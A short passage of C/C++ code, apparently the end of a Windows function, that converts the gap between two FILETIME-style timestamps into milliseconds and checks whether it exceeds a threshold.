	ULONGLONG diffMs = ( uiNow.QuadPart - uiEvent.QuadPart ) / 10000ULL;
	return diffMs > milliseconds;
}
